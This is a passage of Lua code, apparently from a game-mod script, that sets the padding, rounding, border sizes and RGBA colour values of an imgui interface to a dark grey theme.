    style.Alpha = 1;
    style.WindowPadding = imgui.ImVec2(15.00, 15.00);
    style.WindowRounding = 0;
    style.WindowBorderSize = 1;
    style.WindowMinSize = imgui.ImVec2(32.00, 32.00);
    style.WindowTitleAlign = imgui.ImVec2(0.50, 0.50);
    style.ChildRounding = 0;
    style.ChildBorderSize = 1;
    style.PopupRounding = 0;
    style.PopupBorderSize = 1;
    style.FramePadding = imgui.ImVec2(8.00, 7.00);
    style.FrameRounding = 0;
    style.FrameBorderSize = 0;
    style.ItemSpacing = imgui.ImVec2(8.00, 8.00);
    style.ItemInnerSpacing = imgui.ImVec2(10.00, 6.00);
    style.IndentSpacing = 25;
    style.ScrollbarSize = 13;
    style.ScrollbarRounding = 0;
    style.GrabMinSize = 6;
    style.GrabRounding = 0;
    style.TabRounding = 0;
    style.ButtonTextAlign = imgui.ImVec2(0.50, 0.50);
    style.SelectableTextAlign = imgui.ImVec2(0.00, 0.00);
    colors[imgui.Col.Text] = imgui.ImVec4(1.00, 1.00, 1.00, 1.00);
    colors[imgui.Col.TextDisabled] = imgui.ImVec4(0.60, 0.56, 0.56, 1.00);
    colors[imgui.Col.WindowBg] = imgui.ImVec4(0.16, 0.16, 0.16, 1.00);
    colors[imgui.Col.ChildBg] = imgui.ImVec4(0.00, 0.00, 0.00, 0.00);
    colors[imgui.Col.PopupBg] = imgui.ImVec4(0.26, 0.26, 0.26, 1.00);
    colors[imgui.Col.Border] = imgui.ImVec4(0.43, 0.43, 0.50, 0.50);
    colors[imgui.Col.BorderShadow] = imgui.ImVec4(0.00, 0.00, 0.00, 0.00);
    colors[imgui.Col.FrameBg] = imgui.ImVec4(0.20, 0.20, 0.20, 1.00);
    colors[imgui.Col.FrameBgHovered] = imgui.ImVec4(0.33, 0.32, 0.32, 1.00);
    colors[imgui.Col.FrameBgActive] = imgui.ImVec4(0.38, 0.38, 0.38, 1.00);
    colors[imgui.Col.TitleBg] = imgui.ImVec4(0.22, 0.22, 0.22, 1.00);
    colors[imgui.Col.TitleBgActive] = imgui.ImVec4(0.23, 0.23, 0.23, 1.00);
    colors[imgui.Col.TitleBgCollapsed] = imgui.ImVec4(0.00, 0.00, 0.00, 0.51);
    colors[imgui.Col.MenuBarBg] = imgui.ImVec4(0.14, 0.14, 0.14, 1.00);
    colors[imgui.Col.ScrollbarBg] = imgui.ImVec4(0.19, 0.19, 0.19, 1.00);
    colors[imgui.Col.ScrollbarGrab] = imgui.ImVec4(0.23, 0.23, 0.23, 1.00);
    colors[imgui.Col.ScrollbarGrabHovered] = imgui.ImVec4(0.41, 0.41, 0.41, 1.00);
    colors[imgui.Col.ScrollbarGrabActive] = imgui.ImVec4(0.51, 0.51, 0.51, 1.00);
    colors[imgui.Col.CheckMark] = imgui.ImVec4(0.42, 0.43, 0.43, 1.00);
    colors[imgui.Col.SliderGrab] = imgui.ImVec4(0.42, 0.43, 0.43, 1.00);
    colors[imgui.Col.SliderGrabActive] = imgui.ImVec4(0.51, 0.51, 0.51, 1.00);
    colors[imgui.Col.Button] = imgui.ImVec4(0.26, 0.26, 0.26, 1.00);
    colors[imgui.Col.ButtonHovered] = imgui.ImVec4(0.32, 0.32, 0.32, 1.00);
    colors[imgui.Col.ButtonActive] = imgui.ImVec4(0.38, 0.38, 0.38, 1.00);
    colors[imgui.Col.Header] = imgui.ImVec4(0.26, 0.26, 0.26, 1.00);
    colors[imgui.Col.HeaderHovered] = imgui.ImVec4(0.33, 0.32, 0.32, 1.00);
    colors[imgui.Col.HeaderActive] = imgui.ImVec4(0.38, 0.38, 0.38, 1.00);
    colors[imgui.Col.Separator] = imgui.ImVec4(0.38, 0.38, 0.38, 1.00);
    colors[imgui.Col.SeparatorHovered] = imgui.ImVec4(0.38, 0.38, 0.38, 1.00);
    colors[imgui.Col.SeparatorActive] = imgui.ImVec4(0.38, 0.38, 0.38, 1.00);
    colors[imgui.Col.ResizeGrip] = imgui.ImVec4(0.22, 0.22, 0.22, 1.00);
    colors[imgui.Col.ResizeGripHovered] = imgui.ImVec4(0.22, 0.22, 0.22, 1.00);
    colors[imgui.Col.ResizeGripActive] = imgui.ImVec4(0.33, 0.32, 0.32, 1.00);
    colors[imgui.Col.Tab] = imgui.ImVec4(0.26, 0.26, 0.26, 1.00);
    colors[imgui.Col.TabHovered] = imgui.ImVec4(0.33, 0.32, 0.32, 1.00);
    colors[imgui.Col.TabActive] = imgui.ImVec4(0.38, 0.38, 0.38, 1.00);
    colors[imgui.Col.TabUnfocused] = imgui.ImVec4(0.26, 0.26, 0.26, 1.00);
    colors[imgui.Col.TabUnfocusedActive] = imgui.ImVec4(0.38, 0.38, 0.38, 1.00);
    colors[imgui.Col.PlotLines] = imgui.ImVec4(0.61, 0.61, 0.61, 1.00);
    colors[imgui.Col.PlotLinesHovered] = imgui.ImVec4(1.00, 0.43, 0.35, 1.00);
    colors[imgui.Col.PlotHistogram] = imgui.ImVec4(0.90, 0.70, 0.00, 1.00);
    colors[imgui.Col.PlotHistogramHovered] = imgui.ImVec4(1.00, 0.60, 0.00, 1.00);
    colors[imgui.Col.TextSelectedBg] = imgui.ImVec4(0.33, 0.33, 0.33, 0.50);
    colors[imgui.Col.DragDropTarget] = imgui.ImVec4(1.00, 1.00, 0.00, 0.90);
    colors[imgui.Col.NavHighlight] = imgui.ImVec4(0.26, 0.59, 0.98, 1.00);
    colors[imgui.Col.NavWindowingHighlight] = imgui.ImVec4(1.00, 1.00, 1.00, 0.70);
    colors[imgui.Col.NavWindowingDimBg] = imgui.ImVec4(0.80, 0.80, 0.80, 0.20);
    colors[imgui.Col.ModalWindowDimBg] = imgui.ImVec4(0.80, 0.80, 0.80, 0.35);
end